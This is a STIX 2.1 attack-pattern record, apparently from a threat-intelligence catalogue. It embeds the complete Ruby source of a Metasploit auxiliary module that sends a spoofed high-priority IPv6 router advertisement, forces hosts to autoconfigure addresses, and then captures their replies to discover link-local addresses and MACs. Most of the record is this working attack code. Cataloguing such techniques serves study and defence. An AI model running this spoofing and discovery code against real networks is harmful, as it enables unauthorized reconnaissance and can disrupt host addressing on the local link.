{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2d7323bf-59cb-4afa-b4a5-e25c7912d8db",
    "created": "2024-08-14T16:26:32.030258Z",
    "modified": "2024-08-14T16:26:32.030262Z",
    "name": "IPv6 Local Neighbor Discovery Using Router Advertisement",
    "description": " Send a spoofed router advertisement with high priority to force hosts to start the IPv6 address auto-config. Monitor for IPv6 host advertisements and try to guess the link-local address by concatenating the prefix, and the host portion of the IPv6 address.  Use NDP host solicitation to determine if the IP address is valid' ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement.rb",
            "external_id": "ipv6_neighbor_router_advertisement.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Capture\n  include Msf::Exploit::Remote::Ipv6\n  include Msf::Auxiliary::Report\n  def initialize\n    super(\n    'Name'        => 'IPv6 Local Neighbor Discovery Using Router Advertisement',\n    'Description' => %q{\n        Send a spoofed router advertisement with high priority to force hosts to\n        start the IPv6 address auto-config. Monitor for IPv6 host advertisements,\n        and try to guess the link-local address by concatenating the prefix, and\n        the host portion of the IPv6 address.  Use NDP host solicitation to\n        determine if the IP address is valid'\n    },\n    'Author'      => ['wuntee', 'd0lph1n98'],\n    'License'     => MSF_LICENSE,\n    'References'    =>\n    [\n      ['URL','http://wuntee.blogspot.com/2010/11/ipv6-link-local-host-discovery-concept.html']\n    ]\n    )\n\n    register_options(\n    [\n      OptInt.new('TIMEOUT_NEIGHBOR', [true, \"Time (seconds) to listen for a solicitation response.\", 1])\n    ])\n\n    deregister_options('SNAPLEN', 'FILTER', 'PCAPFILE')\n  end\n\n  def generate_prefix()\n    max = 16 ** 4\n    prefix = \"2001:\"\n    (0..2).each do\n        prefix << \"%x:\" % Random.rand(0..max)\n    end\n    return prefix << ':'\n  end\n\n  def listen_for_neighbor_solicitation(opts = {})\n    hosts = []\n    timeout = opts['TIMEOUT'] || datastore['TIMEOUT']\n    prefix = @prefix\n\n    max_epoch = ::Time.now.to_i + timeout\n    autoconf_prefix = IPAddr.new(prefix).to_string().slice(0..19)\n\n    while(::Time.now.to_i < max_epoch)\n      pkt = capture.next()\n      next if not pkt\n      p = PacketFu::Packet.parse(pkt)\n      next unless p.is_ipv6?\n      next unless p.payload\n      next if p.payload.empty?\n      next unless p.payload[0,1] == \"\\x87\" # Neighbor solicitation\n      host_addr = PacketFu::AddrIpv6.new.read(p.payload[8,16]).to_x # Fixed position yay\n      # Make sure host portion is the same as what we requested\n      host_addr_prefix = IPAddr.new(host_addr).to_string().slice(0..19)\n      next unless host_addr_prefix == autoconf_prefix\n      next unless hosts.index(host_addr).nil?\n      hosts.push(host_addr)\n      print_status(\"   |*| #{host_addr}\")\n    end\n\n    return(hosts)\n  end\n\n  def find_link_local(opts = {})\n    shost = opts['SHOST'] || datastore['SHOST'] || ipv6_link_address\n    hosts = opts['HOSTS'] || []\n    smac  = @smac\n    timeout = opts['TIMEOUT_NEIGHBOR'] || datastore['TIMEOUT_NEIGHBOR']\n    network_prefix = Rex::Socket.addr_aton(shost)[0,8]\n\n    hosts.each() do |g|\n      host_postfix = Rex::Socket.addr_aton(g)[8,8]\n      local_ipv6   = Rex::Socket.addr_ntoa(network_prefix + host_postfix)\n      mac = solicit_ipv6_mac(local_ipv6, {\"TIMEOUT\" => timeout})\n      if mac\n        # report_host(:mac => mac, :host => local_ipv6)\n        print_status(\"   |*| #{local_ipv6} -> #{mac}\")\n      end\n    end\n  end\n\n  def create_router_advertisment(opts={})\n    dhost = \"FF02::1\"\n    smac = @smac\n    shost = opts['SHOST'] || datastore['SHOST'] || ipv6_link_address\n    lifetime = opts['LIFETIME'] || datastore['TIMEOUT']\n    prefix = @prefix\n    plen = 64\n    dmac = \"33:33:00:00:00:01\"\n\n    p = PacketFu::IPv6Packet.new\n    p.eth_saddr = smac\n    p.eth_daddr = dmac\n    p.ipv6_hop = 255\n    p.ipv6_next = 0x3a\n    p.ipv6_saddr = shost\n    p.ipv6_daddr = dhost\n\n    payload = router_advertisement_payload\n    payload << opt60_payload(lifetime, prefix)\n    payload << slla_payload(smac)\n    p.payload = payload\n    p.ipv6_len = payload.size\n    ipv6_checksum!(p)\n    return p\n  end\n\n  def opt60_payload(lifetime, prefix)\n    type = 3\n    len = 4\n    prefix_len = 64\n    flag = 0xc0\n    valid_lifetime = lifetime || 5\n    preferred_lifetime = lifetime || 5\n    reserved = 0\n    prefix = IPAddr.new(prefix).to_i.to_s(16).scan(/../).map {|x| x.to_i(16)}.pack(\"C*\")\n    [type, len, prefix_len, flag, valid_lifetime,\n      preferred_lifetime, reserved, prefix].pack(\"CCCCNNNa16\")\n  end\n\n  def slla_payload(smac)\n    type = 1\n    len = 1\n    addr = PacketFu::EthHeader.mac2str(smac)\n    [type,len,addr].pack(\"CCa6\")\n  end\n\n  def router_advertisement_payload\n    type = 0x86\n    code = 0\n    checksum = 0\n    hop_limit = 0\n    flags = 0x08\n    lifetime = 0\n    reachable = 0\n    retrans = 0\n    [type, code, checksum, hop_limit, flags,\n      lifetime, reachable, retrans].pack(\"CCnCCnNN\")\n  end\n\n  def run\n    # Start capture\n    open_pcap({'FILTER' => \"icmp6\"})\n\n    @prefix = generate_prefix()\n    @netifaces = true\n    if not netifaces_implemented?\n      print_error(\"WARNING : Pcaprub is not uptodate, some functionality will not be available\")\n      @netifaces = false\n    end\n\n    @interface = datastore['INTERFACE'] || Pcap.lookupdev\n    @shost = datastore['SHOST']\n    @shost ||= get_ipv4_addr(@interface) if @netifaces\n    raise 'SHOST should be defined' unless @shost\n\n    @smac  = datastore['SMAC']\n    @smac ||= get_mac(@interface) if @netifaces\n    @smac ||= ipv6_mac\n    raise 'SMAC should be defined' unless @smac\n\n    # Send router advertisement\n    print_status(\"Sending router advertisement...\")\n    pkt = create_router_advertisment()\n    capture.inject(pkt.to_s)\n\n    # Listen for host advertisements\n    print_status(\"Listening for neighbor solicitation...\")\n    hosts = listen_for_neighbor_solicitation()\n\n    if(hosts.size() == 0)\n      print_status(\"No hosts were seen sending a neighbor solicitation\")\n    else\n      # Attempt to get link local addresses\n      print_status(\"Attempting to solicit link-local addresses...\")\n      find_link_local({\"HOSTS\" => hosts})\n    end\n\n    # Close capture\n    close_pcap()\n  end\nend\n"
}